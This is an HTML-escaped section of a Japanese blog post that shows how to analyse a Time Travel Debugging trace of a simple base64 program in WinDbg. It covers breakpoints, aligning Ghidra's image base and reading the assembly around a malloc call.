&lt;h2 id=&quot;ttdトレースの解析&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%81%AE%E8%A7%A3%E6%9E%90&quot; aria-label=&quot;ttdトレースの解析 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;TTDトレースの解析&lt;/h2&gt;
&lt;h3 id=&quot;シンボルファイルのロード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot; aria-label=&quot;シンボルファイルのロード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;シンボルファイルのロード&lt;/h3&gt;
&lt;p&gt;WinDbgを起動してTTDトレースファイルを読み込んだら、シンボルファイルをロードしておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sympath+ C:\Try2WinDbg\traces\base64_trace
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reload&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;シンボルファイルが読み込まれていれば関数名で検索ができるようになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt;  x &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;D base64!base64*
002372d0          base64!base64Encode &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;_base64Encode&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
002375a0          base64!base64Decode &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;_base64Decod&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;x /D モジュール名!関数名&lt;/code&gt;で各関数のアドレスが特定できました。&lt;/p&gt;
&lt;h3 id=&quot;ブレークポイントを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;ブレークポイントを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ブレークポイントを設定する&lt;/h3&gt;
&lt;p&gt;次に、各関数の呼び出しアドレスにブレークポイントを設定しておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; bu base64!base64Encode
&gt; bu base64!base64Decode
&gt; bl
0 e Disable Clear  002372d0     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; base64!base64Encode
1 e Disable Clear  002375a0     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  0:&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; base64!base64Decode&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドで実行を開始すると、最初に呼び出される&lt;code class=&quot;language-text&quot;&gt;base64Encode&lt;/code&gt;関数の呼び出し地点で処理が停止します。&lt;/p&gt;
&lt;h3 id=&quot;windbgとghidraのイメージベースをそろえる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%A8ghidra%E3%81%AE%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%83%99%E3%83%BC%E3%82%B9%E3%82%92%E3%81%9D%E3%82%8D%E3%81%88%E3%82%8B&quot; aria-label=&quot;windbgとghidraのイメージベースをそろえる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgとGhidraのイメージベースをそろえる&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lm&lt;/code&gt;の出力から、Base64プログラムが&lt;code class=&quot;language-text&quot;&gt;0x230000&lt;/code&gt;に展開されていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; lm
&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;    &lt;span class=&quot;token keyword&quot;&gt;end&lt;/span&gt;        module name
00230000 002ac000   base64_exe C &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;private pdb symbols&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  C:\ProgramData\Dbg\sym\base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb\E82F6C1FD64A46D7AD5845CF4BD1BF431\base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pdb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ghidraのデコンパイル結果を元にWinDbgの解析をスムーズに行うため、Ghidraのイメージベースの設定を&lt;code class=&quot;language-text&quot;&gt;0x230000&lt;/code&gt;に変更しておきます。&lt;/p&gt;
&lt;p&gt;Ghidraのベースアドレスの変更は、ファイルインポート時の[Options]から行うか、[Window]&gt;[Memory Map]を開いて、右側にある[Set Image Base]ボタンから変更できます。&lt;/p&gt;
&lt;h3 id=&quot;解析したいポイントにブレークポイントを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A7%A3%E6%9E%90%E3%81%97%E3%81%9F%E3%81%84%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;解析したいポイントにブレークポイントを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;解析したいポイントにブレークポイントを設定する&lt;/h3&gt;
&lt;p&gt;これでGhidraのアドレスがWinDbgのアドレスとそろったので、ブレークポイントの設定が容易になりました。&lt;/p&gt;
&lt;p&gt;先ほどデコンパイル結果からどんな挙動か把握できなかった&lt;code class=&quot;language-text&quot;&gt;local_94 = (byte *)((ulonglong)uVar4 &gt;&gt; 0x20);&lt;/code&gt;の箇所にブレークポイントを仕掛けてみましょう。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/fd40540a66045f4e6161c4fcfc79b44c/0b533/image-68.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 42.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAARlAAAEZQAGA43XUAAAB50lEQVQozz2R627aQBCF/f4P0r5A+7OXpFWbtCiBcAsBG0oMiTEYr71re722vw7QZqSjkXZHM+fiXX/7zs+bWwaDKU/zFcFyzWb7QhhuWK0CwTNBsKQ/nPHu/YAPH4dcXc24u39m9vTCOowJd1vCbcRs7uMhZYwm3hXUNRRFjbW1vFm6roMTpEJ/ispyXGOwTcGlTv8N/6tpOjzXtJeFcYlSyDIni2uyTGGrEltYXG3ZLIYckwNaHUlUSmoMutSUtcy5Etc6tMx7JxY6z9hFGq0vDGtboY3CuZrWNbRyNFzNSdNMZvccs5hjfiQt9iSnrhOyKiXROV7lRM5rgr/OOOQQJRVxKoziir0wVmWHESvW0x5GGzlYkOYHlJA4iLJEZKlcUzhHXtqT5I4sN7xEJUkqDOVCUdYcZbAoS0xuqawlfOyR5ylOPCsrqIVIe3GR7p+HVqzyGpHzJlkY2kpCqaz4pc69qRvJpWEzH6L2a5T/iU1/yesoQAUBZh1Q7KLzwlqunFOuJNVUOWS3pHiB1hVt+xYgf7YhmTKkr+JZFBJHG3QSUUlIVithbDGiyPv85SvXP37x++6B216fXn/I3WDEaDw+YzyeMJk+ct8f8DCZMZkvGM4W0n2m/kLgs1gt8ZdLxqN7/gLkZKhOy9W53QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/fd40540a66045f4e6161c4fcfc79b44c/8ac56/image-68.webp 240w,
/static/fd40540a66045f4e6161c4fcfc79b44c/d3be9/image-68.webp 480w,
/static/fd40540a66045f4e6161c4fcfc79b44c/b0a15/image-68.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/fd40540a66045f4e6161c4fcfc79b44c/8ff5a/image-68.png 240w,
/static/fd40540a66045f4e6161c4fcfc79b44c/e85cb/image-68.png 480w,
/static/fd40540a66045f4e6161c4fcfc79b44c/0b533/image-68.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/fd40540a66045f4e6161c4fcfc79b44c/0b533/image-68.png&quot;
            alt=&quot;image-68.png&quot;
            title=&quot;image-68.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;以下のコマンドで&lt;code class=&quot;language-text&quot;&gt;0x00237696&lt;/code&gt;にブレークポイントを設定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; bu 0x00237696&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドで実行を進めると、問題のアドレスにたどり着きました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 637px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f94eefe8d82d62321840849257a4c708/13a9a/image-69.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 80.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAADDElEQVQ4y3VUy47bRhDU//9FLgkQwIfYCAwYcJBL4EOCHFa7q+VSK0rim5wnHxLflRpK2fiSARrdMxqWuqeqexMEJwTBGWlaQCkLrSuaXePvzZ0raSCFgVYutu/m9vp+ZyNKASkV8jxHluWomwZd12EcR/oBfT/i2ndo+xa60sjKFLJRkJWEshLd1OP7tQkOB7y+vuJAfw5DXC5Xggzrj1L0KGSPxU5oH1t0hx4X74L6sV59t+uAGFj2CxDRzws2/quHp+dn7Pd7RFGEZVne/02UPbJiQGdb2JOFCQ2apIE5GKhAAZogdsEiaXq5Ab4RyGOG5/MZp9MJQkjM8w1UMbs8H2ErhWN0gqkNbGMhrWD5Boax2wtdotQCA59pczwG2L+9rWCu9OPxiJLv6pbWA21CU1uE55Dn/LAokMmMT1GgqiqmiHdz1W2OwQGe5yEMzyzbhzEGdV3zxsy4h9Ij9wZJksBayzduuK+YncHl2t7R8C+iy5CZ+Y6QBKXQGIb/3lCrBUUJZlKjKBTcS8wzME13G7He7/uZqriz7O++Yvv3D9g//4zdw4/Iw18wNr/zy28Q8VcU0W8wxWf4u58gsk9Q+Sek8QfGH6HLX1HJz5CMG/0F6P9wLD/hcfsnfO+B/i8EhydEocf0a5JCvVHMtUoR7HYo4xNi38PhuIVIzuiUBMYr0F0Alr9MDXUYBCyZpJwjlkWmBqY/3cq2ZoamLKZqRr1vcYmoyYLJO+3lvJDSk7/F+Yx7yndl2fd9yuaE7cMDttst+mG4s9yT2XFl2aYWaHhIvlbNOf0ZWnP3zoaVZZehDwfseS8reFU3d1J6inuCudxa7dpdUXUVFvz/2hyowRfKJgiO7OUMhtKYHIVchpJJMwrbKMoqhFCC/aspm4ZZ16uMWva+1nqV2rysneKvgE6H3svLOiCEECw1p5g5XeSMiiAeyYiLBFoopBwQSimCNui7Hm3NPr92N2Encby2XRwn7JiArVau5KRpzljx39m7blzlHFtlRbloCHfOuJItFUCTHBiMrWnwD0r7ueWbwqv4AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f94eefe8d82d62321840849257a4c708/8ac56/image-69.webp 240w,
/static/f94eefe8d82d62321840849257a4c708/d3be9/image-69.webp 480w,
/static/f94eefe8d82d62321840849257a4c708/63990/image-69.webp 637w&quot;
              sizes=&quot;(max-width: 637px) 100vw, 637px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f94eefe8d82d62321840849257a4c708/8ff5a/image-69.png 240w,
/static/f94eefe8d82d62321840849257a4c708/e85cb/image-69.png 480w,
/static/f94eefe8d82d62321840849257a4c708/13a9a/image-69.png 637w&quot;
            sizes=&quot;(max-width: 637px) 100vw, 637px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f94eefe8d82d62321840849257a4c708/13a9a/image-69.png&quot;
            alt=&quot;image-69.png&quot;
            title=&quot;image-69.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここから処理の流れを追っていきます。&lt;/p&gt;
&lt;h3 id=&quot;アセンブリを読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A2%E3%82%BB%E3%83%B3%E3%83%96%E3%83%AA%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;アセンブリを読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;アセンブリを読む&lt;/h3&gt;
&lt;p&gt;ブレークポイントを設定した箇所のアセンブリを読んでみました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token number&quot;&gt;00237691&lt;/span&gt; e8 &lt;span class=&quot;token number&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;c        CALL       malloc                                           undefined &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; param_1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        ff ff
&lt;span class=&quot;token number&quot;&gt;00237696&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;83&lt;/span&gt; c4 &lt;span class=&quot;token number&quot;&gt;04&lt;/span&gt;        ADD        ESP&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x4&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;00237699&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;85&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;68&lt;/span&gt;        MOV        dword ptr &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;EBP &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_9c&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;EAX
        ff ff ff
&lt;span class=&quot;token number&quot;&gt;0023769f&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;83&lt;/span&gt; bd &lt;span class=&quot;token number&quot;&gt;68&lt;/span&gt;        CMP        dword ptr &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;EBP &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_9c&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;
        ff ff ff &lt;span class=&quot;token number&quot;&gt;00&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;002376&lt;/span&gt;a6 &lt;span class=&quot;token number&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;07&lt;/span&gt;           JNZ        LAB_002376af&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;EAX&lt;/code&gt;には&lt;code class=&quot;language-text&quot;&gt;malloc&lt;/code&gt;の戻り値であるアドレスが格納されています。&lt;/p&gt;
&lt;p&gt;このアドレスを&lt;code class=&quot;language-text&quot;&gt;[EBP + local_9c]&lt;/code&gt;に格納して0と比較しています。&lt;/p&gt;
&lt;p&gt;ソースコードでいうところの以下の処理です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;length &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;残念ながら、Ghidraのデコンパイル結果のように&lt;code class=&quot;language-text&quot;&gt;local_94 = (byte *)((ulonglong)uVar4 &gt;&gt; 0x20);&lt;/code&gt;の処理を見つけることはできませんでした。&lt;/p&gt;
&lt;p&gt;試しにメモリアドレスの中身も見てみましたが、&lt;code class=&quot;language-text&quot;&gt;malloc&lt;/code&gt;の戻り値がそのまま格納されただけでした。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; dyd &lt;span class=&quot;token namespace&quot;&gt;[ebp-0x98]&lt;/span&gt;
           3          2          1          0
          &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;
0059f800  00000000 11100000 00010110 01101000  00e01668&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;おそらくGhidraのデコンパイルの問題かとは思うのですが、いったい何をもとにこのシフト処理が出力されたのか謎ですね。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;ほんとはBase64の処理をデバッガで追っていくはずだったのですが、いまいち面白い発見がなかったので割愛しました。&lt;/p&gt;
